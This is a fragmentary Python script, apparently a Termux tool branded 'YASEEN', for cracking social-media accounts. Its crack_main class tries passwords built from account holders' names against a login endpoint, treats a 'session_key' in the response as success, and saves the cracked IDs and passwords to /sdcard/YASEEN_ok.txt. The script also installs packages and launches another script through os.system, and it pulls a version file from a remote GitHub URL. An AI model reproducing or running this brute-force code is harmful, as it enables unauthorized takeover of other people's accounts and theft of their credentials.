...
try:
        ...
        os.system('pip install futures==2 && python Free.py')
...
{50*"-"}
 my girlsfriend :     pathni
    Tool Version :     1.3
    Thanks Alot  :     YASEEN KHAN
{50*"-"}'''
...
def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get('https://raw.githubusercontent.com/hop09/libraries/Jan/version.txt').text
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[YASEEN] %s / [OK-%Y] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        ...
                                        print(' \033[1;32m[YASEEN-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/YASEEN_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                else:
                                        continue
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/YASEEN_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/YASEEN' in datar:
        pass
else:
        for i in range(5000):
                print(" data is forked / or in other file")
        exit("Type > cd ~ && python YASEEN.py")
